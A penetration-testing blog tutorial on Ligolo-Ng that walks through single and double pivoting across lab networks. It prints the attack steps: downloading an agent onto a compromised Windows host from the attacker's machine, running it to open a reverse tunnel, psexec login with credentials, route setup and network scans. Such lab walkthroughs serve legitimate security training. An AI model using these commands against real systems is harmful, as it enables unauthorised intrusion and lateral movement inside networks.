<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/tunneling-pivoting/" rel="category tag">Tunneling &amp; Pivoting</a></span>            </div>
            <h1 class="post-title entry-title">A Detailed Guide on Ligolo-Ng</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/" rel="bookmark"><time class="entry-date published" datetime="2024-02-09T17:09:20+00:00">February 9, 2024</time><time class="updated" datetime="2025-06-19T19:41:35+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This comprehensive guide delves into the intricacies of Lateral Movement utilizing <strong>Ligolo-Ng</strong>, a tool developed by Nicolas Chatelain. The <strong>Ligolo-Ng</strong> tool facilitates the establishment of tunnels through reverse TCP/TLS connections using a tun interface, avoiding the necessity of SOCKS. This guide covers various aspects, from the tool’s unique features to practical applications such as single and double pivoting within a network.</span></p>
<p><span style="color: #000000;"><strong>Download Ligolo-Ng:</strong></span></p>
<p><span style="color: #000000;">Ligolo-Ng can be downloaded from the official repository:<span style="color: #0000ff;"> <a style="color: #0000ff;" href="https://github.com/nicocha30/ligolo-ng/releases">Ligolo-Ng Releases</a>.</span></span></p>
<h3><span style="color: #800000;">Table of Contents:</span></h3>
<ol>
<li><span style="color: #000000;">Introduction to Ligolo-Ng</span></li>
<li><span style="color: #000000;">Ligolo V/S Chisel</span></li>
<li><span style="color: #000000;">Lab Setup</span></li>
<li><span style="color: #000000;">Prerequisites</span></li>
<li><span style="color: #000000;">Setting up Ligolo-Ng</span></li>
<li><span style="color: #000000;">Single Pivoting</span></li>
<li><span style="color: #000000;">Double Pivoting</span></li>
</ol>
<h3><span style="color: #800000;">Ligolo-Ng Overview:</span></h3>
<p><span style="color: #000000;">Ligolo-Ng is a lightweight and efficient tool designed to enable penetration testers to establish tunnels through reverse TCP/TLS connections, employing a tun interface. Noteworthy features include its GO-coded nature, VPN-like behavior, customizable proxy, and agents in GO. The tool supports multiple protocols, including ICMP, UDP, SYN stealth scans, OS detection, and DNS Resolution, offering connection speeds of up to 100 Mbits/sec. Ligolo-Ng minimizes maintenance time by avoiding tool residue on disk or in memory.</span></p>
<h3><span style="color: #800000;">Ligolo V/S Chisel:</span></h3>
<ul>
<li><span style="color: #000000;">Ligolo-Ng outperforms Chisel in terms of speed and customization options.</span></li>
<li><span style="color: #000000;">Chisel operates on a server-client model, while Ligolo-Ng establishes individual connections with each target.</span></li>
<li><span style="color: #000000;">Ligolo-Ng reduces maintenance time by avoiding tool residue on disk or in memory.</span></li>
<li><span style="color: #000000;">Ligolo-Ng supports various protocols, including ICMP, UDP, SYN, in contrast to Chisel, which operates primarily on HTTP using a websocket.</span></li>
</ul>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<p><span style="color: #000000;">Follow the step-by-step guide for lateral movement within a network, covering both single and double pivoting techniques.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhvOyJmtPRRGGMaziGrnplh790yGs6EmvG92ltCb8BQPtMIEEz6eRim_f1yOAy5wRNg4xFIuIfIjoX-uAEH26pq6w3MrS1HQ-aw_Vo1JqgqzqAeP2u5dJCtcwpivAZ5DERrDXSSfz7RGKON9I1hyFjh6OrJ7UWqKwNarERs98vqTOu6UyUnTY4CY4C2Knw/s16000/0%20(2).png"/></strong></span></p>
<h3><span style="color: #800000;">Prerequisites</span></h3>
<p><span style="color: #000000;">Obtain the Ligolo ‘agent’ file for Windows 64-bit and the ‘proxy’ file for Linux 64-bit.</span></p>
<p><span style="color: #000000;">Install the ‘agent’ file on the target machine and the ‘proxy’ file on the attacking machine (Kali Linux).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjy_RU0S7LYChZmEfxIT2Ags51YsUlcF4bSlPkywQHZzF3o7RNdB5uCqPV7-L5LPNgmZrS-iITYhfPgPGHnIyi33ktuVOqQN2Qo6gzQuA8uvNS6ZYlXgUQJ98ES81D0IVxudYS_0snRCznA6wrKGQred74RixbCkzkZTPMmrfz7xCHxRU7farKCs9kdWtFJ/s16000/1.png"/></span></p>
<h3><span style="color: #800000;">Setting up Ligolo-Ng</span></h3>
<h4><span style="color: #000000;">STEPS</span></h4>
<h5><span style="color: #000000;"><strong>Step 1:</strong> </span></h5>
<p><span style="color: #000000;">Following the acquisition of both the agent and proxy files, the next step involves the setup of Ligolo-Ng. To ascertain the current status of Ligolo-Ng configuration, the ‘ifconfig’ command is employed. To initiate activation, execute the prescribed sequence of commands as follows:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ip tuntap add user root mode tun ligolo
ip link set ligolo up</pre>
<p><span style="color: #000000;">Verify Ligolo-Ng activation with: <strong>‘ifconfig’</strong> command</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhne9BWPGFfoiqmWRHQAH1dbF5X1WNXbkJ2Lv86mZmlPK0X6yo6hr52cvvCOSp7l0Euik_c_LF80RQvJMdHvr3lfRTMnQYWCVZ0c0i4AwT2ztm_nGl0X5mZv3cFChLjpdS2pHmPB56FCSsQP54DmHpTHp3Rbx6sMUX-Q2AnSDwI2mHwIxBzgZR60Stlc-zF/s16000/2.png"/></span></p>
<h5><span style="color: #000000;"><strong>Step2:</strong> </span></h5>
<p><span style="color: #000000;">Unzip the Ligolo proxy file:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tar -xvzf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz</pre>
<p><span style="color: #000000;">This proxy file facilitates the establishment of a connection through Ligolo, enabling us to execute subsequent pivoting actions. To explore the full range of options available in the proxy file, utilize the ‘help’ command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./proxy -h</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixVbB1mW2i2xB9glLOefgy8TyEvM8_URqUwRQ-BKUX3bFVLqP9poZa9DNARDxQHCZSTcASOPFPKwIL2-6NsoEP8vibBqeGQ0KjXWQ-xBwxOu9lxJSauawKNZXGYl5F0CNodRaAG1aXSM2QnXkZ3PPaJT0dMPRmPChpYGEH-Q_RGtUXxlu9o9qzfFyQXsAw/s16000/3.png"/></span></p>
<h5><span style="color: #000000;"><strong>Step 3:</strong> </span></h5>
<p><span style="color: #000000;">The options displayed in the preceding image are designed for incorporating various types of certificates with the proxy. The chosen approach involves utilizing the ‘-selfcert’ option, which operates on port 11601. Execute the provided command, as illustrated in the accompanying image below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./proxy -selfcert</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWh0HJjXDdD9vYKgyplERpPjc8vfY576KvWXxLPm6kXcP9LoQFimiK5_R8G6-EkwyzK8gYbOlDI6WutRat2VQi7f2d4_N-RunDDT_Pe7jNEq0hPDBnTjXp-XylDKwWOLZLjZubnVszI6wxG1tLlHPZwOgnYdsExnTGVjrg-sF-CKYFMWw_pMxQcFoGuTdU/s16000/4.png"/></span></p>
<h5><span style="color: #000000;"><strong>Step 4:</strong> </span></h5>
<p><span style="color: #000000;">By executing the aforementioned command, Ligolo-Ng becomes operational on the attacking machine. Subsequently, to install the Ligolo agent on the target machine, unzip the ligolo agent file using the command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">unzip ligolo-ng_agent_0.5.1_windows_amd64.zip</pre>
<p><span style="color: #000000;">To facilitate the transmission of this agent file to the target, establish a server with the command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">updog -p 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLOal782eqgI-9diryXXvQAwNgvurwpTWqkpz7_469K1D68HDYWU-U5cLCaIcL8mkN1rN1jXhnfzNjfRKm_LVxXbIspM_6FWCIYxYN2Xc7YZ7L2JLDnnqH-DLKfHA1aVjiDush5fZi6eBoKhNCyBZ71wQxLc0GsW2HTN0yJstCll4u9_k6aber5MwqF0M9/s16000/5.png"/></span></p>
<h5><span style="color: #000000;"><strong>Step 5:</strong> </span></h5>
<p><span style="color: #000000;">In the context of lateral movement, a session has been successfully acquired through netcat. Utilizing the established netcat connection, the next step involves downloading the Ligolo agent file onto the target system. Referencing the image below, execute the provided sequence of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Desktop
powershell wget 192.168.1.5/agent.exe -o agent.exe
dir</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhebsEEJ06iSf33oK0zvAykgTNCp-e_hjpCode1XTrnWsjxfdhMevtvvVv2XLV8MN3P5UQEbRlFtKQ4dmWzsua0sJTPPR0ovP59lM3-GcjDhxr9jAADkjyFrVFXX7IjMtzd559QYhbmhZC3q8c9zKuxApDS3-1HnG1pf4Kq4W31EGjRyWYaJezCbJNnoOS0/s16000/6.png"/></span></p>
<h5><span style="color: #000000;"><strong>Step 6:</strong> </span></h5>
<p><span style="color: #000000;">Evidently, the agent file has been successfully downloaded. Given that the proxy file is presently operational on Kali, the subsequent action involves executing the agent file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./agent.exe -connect 192.168.1.5:11601 -ignore-cert</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-sFXx1XOKCVK1q2h9s-lA9L7QqFCbu3MMmeGgFR8VjJiuRvjzW7Pf0KiHsVgMjuvFRfD8baJuzANZ_nyKhZXtVXDhPwoL2R4rjlSFNtButi7Ba0Hza3D9RIlwkc53pm5u_QW9Kq51EJyaQP-pT0XU-9eP-U6kHZh1YjQDOfNsiWedd0qA9Kl3sGNTkkFm/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Upon executing the specified command, a Ligolo session is initiated. Subsequently, employ the ‘session’ command, opting for ‘1’ to access the active session. Following the session establishment, execute the ‘ifconfig’ command as illustrated in the provided image.</span></p>
<p><span style="color: #000000;">Notably, it discloses the existence of an internal network on the server, denoted by the IPv4 Address 192.168.148.130/24. This discovery prompts further exploration into creating a tunnel through this internal network in the subsequent steps.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4mjv_1QxY6QZaw7nyR7vagoJ2pAGNmQvabLXHEQU4A8IcTvxhiI6QA7p3iYqeLypIi5uer5sEU_mREaQjF9UMurV8CpW0bnq-r7ScaSkRwteClFuc90e9TOh439PLonWVjH8oz7NKW_kggTno6FUymD-oVLm_ibJy4oIZmWoypXejeMyERQfF5lf8Ryop/s16000/8.png"/></span></p>
<h3><span style="color: #800000;">Single Pivoting</span></h3>
<p><span style="color: #000000;">In the single pivoting scenario, the aim is to access Network B while staying within the boundaries of Network</span><span style="color: #000000;">                                 </span></p>
<p><span style="color: #000000;">                                       <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuhNXjCf1K26YEXV5c4rv03GPpQjqsb2uCwj-jXjRxTE4rhCmbvOu9ieAtg6SbPwwoEbGxPyVwe-vmNfm0mDC8M6qKAMzYCEFaGOR2rOYHA3r4zu1EFn1o2xyqE7wn6uzGlFxxcF86z2Xc_LqU4ONH76OSI2Bf_RJdm4Ard2xX0KNgrpV9KVuBNC-7Y5NS/s16000/8_0.png"/></span></p>
<p><span style="color: #000000;">Attempting a direct ping to Network B reveals, as illustrated in the image below, the impossibility due to different network configuration.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTr1lQLH_QAds0wtEHOJtkiXYnsLPFe6gSo7m9R5fY-h8AfdVsORDvkJMnthJnwMmB5j0kassK4zBRJHppctiKZsBq13A12oFfLh6tn39lNff8y2mjouY5PCI8tO3pnI-7KdHzJyvza0wqmaIP3-KutuiDWUV1BMlgtocQbDUyk7AJaVTJGuhQKDUwKHhC/s16000/8_1.png"/></span></p>
<p><span style="color: #000000;">To progress towards the single pivoting objective, a new terminal window will be opened. Subsequently, the internal IP will be added to the IP route, and the addition will be confirmed, as illustrated in the image below, utilizing the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ip route add 192.168.148.0/24 dev ligolo
ip route list</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhv5KFovvhujze3Rp-BDiPDoA2qxRzDZ4rF4pggTVa2FBQV0rvuIjJjvo16PmlP84xixcOOWRX7FSsLHwkiGj5j2xNlnZZ1F_p-wqsNe_sLR-59IfLCu7MYausTJk_IFwFN3Xz40OYh6CKM8fqJb1F9tFyd6l-A4S8nOqZlx0UKUf1vqkZcGRVmrJyxc0p6/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Return to the Ligolo proxy session window and initiate the tunneling process by entering the ‘start’ command, as demonstrated in the provided image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh16KQ11MS_-BFE50-hjsjAcalJltSNBCWYwLWEYhwOMZA9h9yiuoO9yUuiXlNREypvOPZcPRmpUCTRzGFE3OEKHG20e6Tscak_yNCpVVvxLFr3r1BopOkrG0KKIMB3pkc52vc45snlppv6l-nK17ZFKZ9hyqPOdPQI09QJUVe_yNTx5kk1ruMxMxdZNSq7/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Upon establishing a tunnel into network B, we executed the netexec command to scan the network B subnet, unveiling an additional Windows 10 entity distinct from DC1, as depicted in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKTkUrmmA4RmLiSmEJdKIs82QzwlXMuOfRDWPrhj3fPP90p3vH18fMHV3_wLy5SdF9y6L6wA7hdmkKgTPvNPnmowobWrfQJm78tVCbnWxEcOr2iqHZJSXaYMhvlbGbwuyLwWxO_Hh6botPln7Yl2Xt1m8NeAQLGSEy-tw8NrmbITz2hKuGeD14CqJCwEFy/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Upon attempting to ping the IP now, you will observe successful ping responses, contrasting with the previous unsuccessful attempts. Additionally, you can conduct a comprehensive nmap scan, as illustrated in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_Z9JA9DDc7uaROLGl5ROO9regLfIpStCky4Y4j-2Mk10DrrqFVvNMGpdS9hMZickHcpZI1LQAnHlyVB-2dRp9Qfx9R-VtWWdtl2mDs2ugoouxo3PKTnNyFCVW1L-_6dK34X92eFafY4Z-WS6GquAowgAfxnf_5U41CLwIUxWb2YM3t98yW0_J5HRP2N9T/s16000/12.png"/></span></p>
<h3><span style="color: #800000;">Double Pivoting</span></h3>
<p><span style="color: #000000;">In the process of double pivoting, our objective is to gain access to Network C from Network A, utilizing Network B as an intermediary.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8GwMd8Uw6hMmZMZkCFK5YxCN4_MdmMidck5qBewqXnK9DLeg0rcJDil9byRvMqwTeJf9YNRlXvDRPV7dk2_ozbS_l9eL0EHBNtV0irevhGHdYEZ5NOeeUK0y3YFrjLGq5HfJ5wPu9KRNp2YoUy8qPpqQzWlcERizYnsiM5xQ7uvhJH08Jl8NDelgH0Diq/s16000/12_1.png"/></span></p>
<p><span style="color: #000000;">From the newly opened terminal window, utilize the Impacket tool to access the identified Windows 10 with the IP 192.168.148.132. Following this, execute the subsequent set of commands to download the Ligolo agent onto Windows 10</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec administrator:123@192.168.148.132
cd c:\users\public
powershell wget 192.168.1.5/agent.exe -o agent.exe
dir</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRmyizQf5ZvDngD2D725UxM6q2-FhyphenhyphenlvpTNsqh5RCNbPWc9LF40QQgeuM0f9_kOi_sN6McPUu_bfO3C4ozNJUoclCbQAQ7hDDJu_19lRt2pJOoeRrVkzxur-almmlPKFWEHwNEl79YSsFx4Iczsu5WkQuV8uTVcCBvj4pcGjvdEYXQdneqt2D1jMj-uxS2/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Subsequently, initiate the execution of the agent.exe. Upon completion, a session will be established, given that our Ligolo proxy file is already operational.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">agent.exe -connect 192.168.1.5:11601 -ignore-cert</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPsRYN3ePRTrs35ogR0aT_ULRGE8nROJBWPBYrfAhydbfNNecBZquR9RY_fAOb-A74vFqeKIBo3W0BP92NQ3Bj3UaPLoH6gpbgLQD-1N0z9nLqk3iknMJahnIAtA4m9zoKM9E8EEaqU-xhOh0HCXv2YawIfen4W1lELLryaURHKSdXauLXWCwIr1HWT29d/s16000/14.png"/></span></p>
<h5><span style="color: #000000;"><strong data-start="910" data-end="961">Initiating and Managing a New Ligolo-Ng Session</strong></span></h5>
<p><span style="color: #000000;">Examine Ligolo-ng proxy server, a new session, corresponding to Windows 10, will be present, as indicated in the accompanying image. Execute the ‘start’ command to initiate additional tunnelling.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEih5KMswGU2_YlJT5bo4pYw7O_-EAsZB2wiWYQcKq8xFrynB3WWfJ05o92jh8xz3L98VCORvH2v64foXaWp-M-BEcPZw3_s7lILl7LsfKJuvy_abX3ydJKF2HMFHp5lSBDi0FmjQZQXXeI3HNkw6x3A2diR7aXpfZv8Jhq5VTKxtLr5nc6uBMWbe31oPlgy/s16000/15.png"/></span></p>
<p><span style="color: #000000;">Execute the ‘session’ command to display the list of sessions. Navigate through the sessions using arrow keys, selecting the desired session for access. In this instance, the aim is to access the latest session, identified as session 2. Select this session and utilize the ‘ifconfig’ command to inspect the interfaces. This action reveals an additional <strong>network C</strong> interface with the address <strong>192.168.159.130/24</strong>, mirroring the details depicted in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBaIBkua2OSamc_38VF1Qj8WdBvlkIIqEYiK7fe6-4z2dRLkZGQqNfi8fVBea4CssisWJRUN0cZl1H769YEvg68zU27Fb08NaLTe6KksLzRyC5TbCg-5Q8FXbQzAokyuTSvF_KhBYDNs4boNeKI7qk02OHehaC9H3E64l5QuGht6YDYOn1inf0AVTB315i/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Upon identifying the new network, the initial step involves attempting a ping. However, the image below indicates an absence of connectivity between Kali and the network C.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQp0xcIaW4vn2KffSqLK64d_HHaofbC061qg9ITK0KfalwhApWrlFJmuzQlYxkN9lTlTPX3yyHh1uIyBfKl4cZFq-_3OtqCnfRI-qBUixFVI6zbUs7iTLXw0mAHQj3MeSJgVb4T6q1P08n7Asgu8ydxnUXHYMpMWZIrcTtDLYy_5zbPwh_QAtJIwBizTDX/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Add the Network C Subnet in the IP route list with the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ip route add 192.168.159.0/24 dev ligolo
ip route list</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjK5CSrh9xf40HZhnMpKJOVmLWu6Ih6izinwV9wILTtSIUk3bQtxcXrNR-OBUZkVkFNegY8N1L8mV43-GC1oppSH75LeLhrWPRUuwYJQ8adb8_SK_y-R5TezleMVoNKweIt5JbNF_qjT3J76qAfvahVtMTy7Tai__NrFFHBXTeJ7faxMf4PH-51DNkKcPR/s16000/18.png"/></span></p>
<p><span style="color: #000000;">With the modification of our IP route, the next step involves the addition of a listener to traverse the intra-network and retrieve the session. To incorporate the listener, utilize the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0EQ-LBMVYiwpRsauiwi6Ej3mLqmC0bqZDREvVMerjrEgZrhF5-xQoS4SuArJmRiADGN-LJh421uPN6R1O56f3dbcrJjYijTlxu0UpJJRadiMoz1xOXZSw3QjuMB7Zxs30uherw8YlmKebwuE8NuUrDBiB3oZo2SrMTTelb-_tBZWlPANgzhilXLdFBaA5/s16000/19.png"/></span></p>
<p><span style="color: #000000;">The image above confirms the activation of the listener. To initiate tunneling, refer to available options using the help command. It becomes evident that halting the ongoing tunneling in session 1 is necessary before starting the process in session 2. This step-by-step approach facilitates the transfer of data to the listener, which subsequently retrieves the necessary information. </span></p>
<h5><span style="color: #000000;"><strong data-start="2612" data-end="2652">Verifying Successful Double Pivoting</strong></span></h5>
<p><span style="color: #000000;">This operational technique, known as double pivoting, involves stopping the initial tunneling in the <strong>first session</strong> using the ‘<strong>stop</strong>‘ command. In <strong>second session</strong>, execute the ‘<strong>start</strong>‘ command, following the steps illustrated in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmjBIek4F4wDvqcxVj8idQWBsPolKvG8rB7t3aWpI_i1j4XcGHqIC1LjgIswPoQ40Y29H3KjgpxiBC63sOOqAaDPRTtxsnOBNOEDYximhczBQbI_1JrlRFRhme7aWF0TutnshsaGyT-sH1PSmn9gVCFH_PWmT8mQdPc78cfTpqJdH1Jpzr5Zhai7M_6YGI/s16000/20.png"/></span></p>
<p><span style="color: #000000;">Executing double pivoting was successful, and its verification occurred through the utilization of crackmapexec with the command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.159.0/24</pre>
<p><span style="color: #000000;">Discovering Metasploitable2 within the network followed. This led to the ability to conduct a ping and nmap scan, leveraging the acquired network access, as illustrated in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCmFuqFciCVNXpg4k9k5z1qQX1F8ETbVr_c0514mqSZm8omn7zCjuz7ovWHUlC58YLsUgfrvo_1h27I23lryQvHFYHe2LPbD3UDT6EApXSs2zzvSe84JSXNWaRZMzrykBFMnYGXiH6hF7d5BaCRomSM_DE_HCwwyBlxmH8SsUP1lRRv3GsHYmyb9v_Wjpt/s16000/22.png"/></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/chisel-port-forwarding-a-detailed-guide/" title="A Detailed Guide on Chisel">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on Chisel</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/" title="A Detailed Guide on AMSI Bypass">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on AMSI Bypass</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/burpsuite-for-pentester-autorize/" rel="prev">Burp Suite for Pentester: Autorize</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/64-bit-linux-assembly-and-shellcoding/" rel="next">64-bit Linux Assembly and Shellcoding</a></div></div>
	</nav>        </div>
